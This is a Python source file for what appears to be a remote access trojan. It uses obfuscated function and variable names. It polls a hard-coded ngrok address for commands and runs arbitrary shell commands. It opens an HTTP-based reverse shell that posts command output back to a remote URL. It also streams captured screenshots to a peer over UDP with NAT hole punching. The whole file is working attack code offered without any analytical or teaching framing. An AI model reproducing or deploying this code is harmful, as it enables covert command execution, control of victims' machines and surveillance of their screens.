class Peer:
    def __init__(self):
        self.initialize_data()
        self.peer_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.peer_socket.bind(('', self.port))
        self.tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def initialize_data(self):
        self.public_ip = self.get_public_ip()
        self.private_ip = self.get_private_ip()
        self.port = randint(1000, 9999)

    def send(self, data, address):
        self.peer_socket.sendto(data, address)

    def get_public_ip(self):
        _, public_ip, _ = stun.get_ip_info(
            stun_host="stun.l.google.com",
            stun_port=19302
        )
        return public_ip

    def get_private_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return None

    def get_rendezvous_data(self, server_addr):
        data = f"{self.public_ip}@{self.private_ip}@{self.port}"
        self.tcp_client.connect(server_addr)
        self.tcp_client.send(data.encode('utf-8'))
        data = self.tcp_client.recv(1024).decode('utf-8')
        data = data.split('@')
        port = int(data[2])
        if data[0] == self.public_ip:
            print("connected on the same NAT")
            return (data[1], port)
        else:
            print("connected behind differect NAT")
            return (data[0], port)

    def punch_hole(self, address):
        self.peer_socket.sendto(b'0', address)


def rev234ajksfj32030co2030asoficmoerir(URL):
    EXIT = False
    while not EXIT:
        try:
            resspdifsdkfjs = requests.get(URL)
            if resspdifsdkfjs.text.split(' ')[0] == 'exit':
                EXIT = True
                output = "Terminating Session"
            elif resspdifsdkfjs.text.split(' ')[0] == 'cd':
                os.chdir(resspdifsdkfjs.text.split(' ')[1])
                output = "directory changed"
            else:
                outpsu3029lks = subprocess.run(resspdifsdkfjs.text, capture_output=True, text=True, shell=True)
                if outpsu3029lks.returncode == 0:
                    output = outpsu3029lks.stdout
                else:
                    output = outpsu3029lks.stderr
        except Exception as e:
            output = f'Exception : {e}'
        requests.post(URL, data=output.encode('utf-8'))


def scrslkjdfBrdsdkjfs(rendezvous_saddr, stop):
    SCALE_FACTOR = 0.5
    MAXDGRAMSIZE = 65507
    ADDRESS = (rendezvous_saddr.split(':')[0], int(rendezvous_saddr.split(':')[1]))
    p = Peer()
    p2addr = p.get_rendezvous_data(ADDRESS)
    p.punch_hole(p2addr)
    with mss.mss() as sct:
        monitor = 1
        while True:
            img = sct.grab(sct.monitors[monitor])
            img = numpy.array(img)
            img_rgb = img[:, :, :3]
            new_width = int(img_rgb.shape[1] * SCALE_FACTOR)
            new_height = int(img_rgb.shape[0] * SCALE_FACTOR)
            resized_img = cv2.resize(img_rgb, (new_width, new_height))
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode('.jpg', resized_img, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            compressed = zlib.compress(buffer.tobytes())
            if len(compressed) > MAXDGRAMSIZE:
                print("size too big")
                continue
            p.send(compressed, p2addr)
            if stop():
                break


def ge230askdfj29rTaedskf30rafjd0():
    try:
        coskdfi2309fwjls093f2 = requests.get("https://allegedly-great-shiner.ngrok-free.app")
        if "(ERR_NGROK_3200)" in coskdfi2309fwjls093f2.text:
            coskdfi2309fwjls093f2 = None
    except Exception:
        coskdfi2309fwjls093f2 = None
    return coskdfi2309fwjls093f2


if __name__ == "__main__":
    stop_thread = False
    while True:
        sldkfjow0239rf2j = ge230askdfj29rTaedskf30rafjd0()
        if sldkfjow0239rf2j is not None:
            sldkfjow0239rf2j = sldkfjow0239rf2j.text
            if sldkfjow0239rf2j == "<SLEEP>":
                print("sleeping")
                time.sleep(1)
            elif sldkfjow0239rf2j == "<TERMINATE>":
                break
            elif "<INTERACT>" in sldkfjow0239rf2j:
                URL = sldkfjow0239rf2j.split('@')[1].strip()
                threading.Thread(target=rev234ajksfj32030co2030asoficmoerir, args=[URL]).start()
            elif "<VIEWSCREEN>" in sldkfjow0239rf2j:
                URL = sldkfjow0239rf2j.split('@')[1].strip()
                stop_thread = False
                threading.Thread(target=scrslkjdfBrdsdkjfs, args=[URL, lambda: stop_thread]).start()
            elif sldkfjow0239rf2j == "<STOPSCREEN>":
                stop_thread = True
            else:
                try:
                    subprocess.Popen(sldkfjow0239rf2j, shell=True)
                except Exception:
                    print("error while executing")
        else:
            print("None")
        time.sleep(1)
